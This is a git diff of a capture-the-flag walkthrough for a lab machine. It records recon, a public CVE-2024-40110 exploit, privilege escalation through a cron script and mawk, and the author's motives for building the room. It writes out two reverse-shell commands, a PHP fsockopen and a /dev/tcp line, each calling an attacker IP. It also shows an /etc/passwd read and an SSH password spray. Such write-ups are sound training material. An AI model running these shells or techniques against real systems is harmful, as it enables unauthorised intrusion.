@@ -20,133 +20,234 @@
 
 ![RCE](./img/04.png)
 
-Nmap vulnerabilities scan:
+# Nmap vulnerabilities scan:
 
-Web recon and enumeration by softwares and tecnology:
+![RCE](./img/05.png)
 
-Access the URL indicate http://10.10.170.103/
+![RCE](./img/06.png)
 
-Identified the support user e-mail as support@agropro.local
+![RCE](./img/07.png)
 
-Bruteforce files and direcitories, identified the “/ranch” directory:
+# Web recon and enumeration by softwares and tecnology:
 
-New web enumeration on directory discovered indicate the Titlle “RedCock Farm”:
+![RCE](./img/08.png)
 
-Access the new URL indicate http://10.10.170.103/ranch/
+![RCE](./img/09.png)
 
-New files and directories bruteforce
+# Access the URL indicate http://10.10.170.103/
+
+![RCE](./img/10.png)
+
+# Identified the support user e-mail as support@agropro.local
+
+![RCE](./img/11.png)
+
+# Bruteforce files and direcitories, identified the “/ranch” directory:
+
+![RCE](./img/12.png)
+
+# New web enumeration on directory discovered indicate the Titlle “RedCock Farm”:
+
+![RCE](./img/13.png)
+
+# Access the new URL indicate http://10.10.170.103/ranch/
+
+![RCE](./img/14.png)
+
+# New files and directories bruteforce
+
+![RCE](./img/15.png)
 
 ## Theat modeling
 
-Search for exploits:
+# Search for exploits:
+
+![RCE](./img/16.png)
 
 https://www.exploit-db.com/exploits/52053
 
-Exploit download:
+# Exploit download:
 
-Necessary adjustment:
+![RCE](./img/17.png)
 
-After adjustment:
+# Necessary adjustment:
 
-Executing the exploit - fail:
+![RCE](./img/18.png)
 
-Search for other exploit:
+![RCE](./img/19.png)
+
+# After adjustment:
+
+![RCE](./img/20.png)
+
+![RCE](./img/21.png)
+
+# Executing the exploit - fail:
+
+![RCE](./img/22.png)
+
+# Search for other exploit:
+
+![RCE](./img/23.png)
 
 https://github.com/thiagosmith/CVE-2024-40110
 
+# Raw code
+
 https://raw.githubusercontent.com/thiagosmith/CVE-2024-40110/refs/heads/main/exploit.py
 
-Download new exploit:
+![RCE](./img/24.png)
 
-Necessary new adjustment:
+# Download new exploit:
 
-After new adjustment:
+![RCE](./img/25.png)
 
-Executing the exploit - bingo!!!
+# Necessary new adjustment:
 
-Creating a payload of reverse Shell to the target:
+![RCE](./img/26.png)
+
+![RCE](./img/27.png)
+
+# After new adjustment:
+
+![RCE](./img/28.png)
+
+![RCE](./img/29.png)
+
+# Executing the exploit - bingo!!!
+
+![RCE](./img/30.png)
+
+# Creating a payload of reverse Shell to the target:
 
 https://www.revshells.com/
 
+![RCE](./img/31.png)
+
+PHP Choise because the application is PHP!!!
+
+```
 php -r '$sock=fsockopen("10.17.51.216",9001);exec("sh <&3 >&3 2>&3");'
+```
 
-Listener:
+# Listener:
 
-Executing the revserse shell command on pseudo-shell by exploit:
+![RCE](./img/32.png)
 
-Receiver the reverse shell:
+# Executing the revserse shell command on pseudo-shell by exploit:
 
-Shell improvement:
+![RCE](./img/33.png)
 
-Internal enumeration:
+# Receiver the reverse shell:
 
-Read file:
+![RCE](./img/34.png)
 
+# Shell improvement:
+
+![RCE](./img/35.png)
+
+# Internal enumeration:
+
+![RCE](./img/36.png)
+
+Discovered the “includes/dbconnection.php”
+
+# Read file:
+
+![RCE](./img/37.png)
+
+```
 db: 
 user: 
 pass: 
+```
 
-Reading the /etc/passwd file finding users in the host:
+# Reading the /etc/passwd file finding users in the host:
 
+![RCE](./img/38.png)
+
+```
 cat /etc/passwd | cut -d ":" -f 1
+```
 
-Password spay with hydra on ssh service:
+# Password spay with hydra on ssh service:
 
+![RCE](./img/38.png)
+
+```
 ssh 
 host: 10.10.170.103   
 login: 
 password: 
+```
 
-Initial acess from ssh user and pass. The first flag!!!
+# Initial acess from ssh user and pass. The first flag!!!
 
+![RCE](./img/39.png)
 
 ## Task 2 - Lateral movement and horizontal privilege escalation.
 
-Locate linpeas.sh
+# Locate linpeas.sh
+
+![RCE](./img/40.png)
 
 https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 
-Download linpeas.sh
+![RCE](./img/41.png)
 
-Listener with web server in python:
+# Download linpeas.sh
 
-Request from target:
+![RCE](./img/42.png)
 
-Assigning execution rights to the binary file and execution:
+# Listener with web server in python:
+
+![RCE](./img/43.png)
+
+# Request from target:
+
+![RCE](./img/44.png)
+
+# Assigning execution rights to the binary file and execution:
+
+![RCE](./img/45.png)
 
 ## Important reports
 
-Kernel exploits less - probable:
+# Kernel exploits less - probable:
 
-Crontab:
+![RCE](./img/46.png)
 
-Writable files:
+# Crontab:
 
-Backup Folders:
+# Writable files:
 
-Analyzing reported script:
+# Backup Folders:
 
-Searching for a new reverse shell:
+# Analyzing reported script:
 
+# Searching for a new reverse shell:
+
+```
 sh -i >& /dev/tcp/10.17.51.216/9001 0>&1
+```
 
-Inserting my reverse shell into the script:
+# Inserting my reverse shell into the script:
 
-Opening the listner and wait the cron job:
+# Opening the listner and wait the cron job:
 
-Receive the reverse shell and taking the second user flag:
+# Receive the reverse shell and taking the second user flag:
 
 ## Task 3- Vertical Privilege Escalation
 
-Improving the shell:
+# Improving the shell:
 
-Checking permissions:
+# Checking permissions:
 
-Searching about “mawk” on GTFOBINS:
+# Searching about “mawk” on GTFOBINS:
 
-https://gtfobins.github.io/gtfobins/mawk
+# https://gtfobins.github.io/gtfobins/mawk
 
-Escalating privilege vertically and getting the final root flag:
+# Escalating privilege vertically and getting the final root flag:
 
 ## Final words:
 # The intention behind creating this room arose when, at a certain moment, I was researching exploits for vulnerable applications on the exploit-db.com website.
@@ -163,7 +264,7 @@ Escalating privilege vertically and getting the final root flag:
 
 ## About the author:
 
-https://www.linkedin.com/in/smith-braz-938825209/
+# https://www.linkedin.com/in/smith-braz-938825209/
 
 
 
